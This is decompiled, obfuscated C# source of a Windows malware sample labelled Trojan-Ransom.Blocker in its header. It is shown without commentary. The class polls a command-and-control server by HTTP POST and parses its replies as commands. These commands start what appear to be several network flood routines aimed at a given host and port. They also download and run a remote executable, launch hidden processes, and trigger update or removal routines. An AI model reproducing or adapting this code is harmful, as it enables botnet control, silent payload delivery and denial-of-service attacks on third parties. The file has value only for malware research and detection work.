// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2EAA04FB-4A12-46FB-89C9-8F20DEF80030
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.heqk-a676fa6fd1e5c420949ebe87d886c57cc8693a1c182562bacd2c8a70cf0dc574.exe

using \u0003;
using \u0005;
using \u0010;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0005
{
  internal class \u0004
  {
    private string \u0001 = string.Empty;

    public void \u001D()
    {
      this.\u001E();
      new Thread(new ThreadStart(this.\u001F)).Start();
    }

    private void \u001E()
    {
      string str1 = \u0002.\u001C(1) + \u0015.\u0001.\u001D + \u0002.\u001C(18) + \u0015.\u0001.\u0018 + \u0002.\u001C(31) + \u0015.\u0001.\u001E + \u0002.\u001C(44) + \u0015.\u0001.\u001F;
      while (true)
      {
        try
        {
          string str2 = this.\u0014(\u0015.\u0001.\u0017, str1);
          if (str2.Length > 0)
          {
            if (str2 == \u0015.\u0001.\u001A)
              break;
            Environment.Exit(-1);
          }
        }
        catch
        {
        }
        Thread.Sleep(\u0015.\u0001.\u001B * 60 * 1000);
      }
    }

    private void \u001F()
    {
      string str1 = \u0002.\u001C(57) + \u0015.\u0001.\u001D;
      while (true)
      {
        try
        {
          string str2 = this.\u0014(\u0015.\u0001.\u0017, str1);
          if (str2.Length > 0)
          {
            if (str2 != this.\u0001)
            {
              this.\u007F(str2);
              this.\u0001 = str2;
            }
          }
          else
          {
            try
            {
              \u0017.\u0099();
            }
            catch
            {
            }
            try
            {
              \u0013.\u0090();
            }
            catch
            {
            }
            try
            {
              \u0011.\u008E();
            }
            catch
            {
            }
            try
            {
              \u000E.\u008B();
            }
            catch
            {
            }
            this.\u0001 = string.Empty;
          }
        }
        catch
        {
        }
        Thread.Sleep(\u0015.\u0001.\u001B * 60 * 1000);
      }
    }

    private string \u0014([In] string obj0, [In] string obj1)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(obj0);
      httpWebRequest.ContentType = \u0002.\u001C(74);
      httpWebRequest.Method = \u0002.\u001C(119);
      httpWebRequest.UserAgent = \u0015.\u0001.\u001A;
      byte[] bytes = Encoding.ASCII.GetBytes(obj1);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
    }

    private void \u007F([In] string obj0)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = obj0.Split('*');
      }
      catch
      {
      }
      string key;
      if ((key = strArray[0]) == null)
        return;
      if (\u001B.\u0001 == null)
        \u001B.\u0001 = new Dictionary<string, int>(8)
        {
          {
            \u0002.\u001C(128),
            0
          },
          {
            \u0002.\u001C(141),
            1
          },
          {
            \u0002.\u001C(154),
            2
          },
          {
            \u0002.\u001C(167),
            3
          },
          {
            \u0002.\u001C(180),
            4
          },
          {
            \u0002.\u001C(193),
            5
          },
          {
            \u0002.\u001C(202),
            6
          },
          {
            \u0002.\u001C(211),
            7
          }
        };
      int num;
      // ISSUE: explicit non-virtual call
      if (!__nonvirtual (\u001B.\u0001.TryGetValue(key, out num)))
        return;
      switch (num)
      {
        case 0:
          try
          {
            \u0017.\u0003 = Convert.ToString(strArray[1]);
            \u0017.\u0005 = ushort.Parse(strArray[2]);
            \u0017.\u0008 = Convert.ToInt32(strArray[3]);
            \u0017.\u0007 = Convert.ToInt32(strArray[4]);
            \u0017.\u0098();
            break;
          }
          catch
          {
            break;
          }
        case 1:
          try
          {
            \u0013.\u0003 = Convert.ToString(strArray[1]);
            \u0013.\u0005 = Convert.ToInt32(strArray[2]);
            \u0013.\u008F();
            break;
          }
          catch
          {
            break;
          }
        case 2:
          try
          {
            \u0011.\u0003 = Convert.ToString(strArray[1]);
            \u0011.\u0005 = ushort.Parse(strArray[2]);
            \u0011.\u0008 = Convert.ToInt32(strArray[3]);
            \u0011.\u000E = Convert.ToInt32(strArray[4]);
            \u0011.\u0006 = Convert.ToInt32(strArray[5]);
            \u0011.\u008D();
            break;
          }
          catch
          {
            break;
          }
        case 3:
          try
          {
            \u000E.\u0003 = Convert.ToString(strArray[1]);
            \u000E.\u0006 = ushort.Parse(strArray[2]);
            \u000E.\u000E = Convert.ToInt32(strArray[3]);
            \u000E.\u0004 = Convert.ToInt32(strArray[4]);
            \u000E.\u0007 = Convert.ToInt32(strArray[5]);
            \u000E.\u008A();
            break;
          }
          catch
          {
            break;
          }
        case 4:
          try
          {
            string str = \u0015.\u0002.\u0096(new Random().Next(5, 12)) + \u0002.\u001C(220);
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable(\u0002.\u001C(229)) + \u0002.\u001C(238) + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable(\u0002.\u001C(229)) + \u0002.\u001C(238) + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case 5:
          try
          {
            Process process = new Process()
            {
              StartInfo = new ProcessStartInfo(Convert.ToString(strArray[1]))
            };
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            break;
          }
          catch
          {
            break;
          }
        case 6:
          \u0015.\u0004.\u0084(Convert.ToString(strArray[1]));
          break;
        case 7:
          if (!(strArray[1] == Environment.MachineName) && !(strArray[1].ToUpper() == \u0002.\u001C(243)))
            break;
          \u0015.\u0004.\u0086();
          break;
      }
    }
  }
}
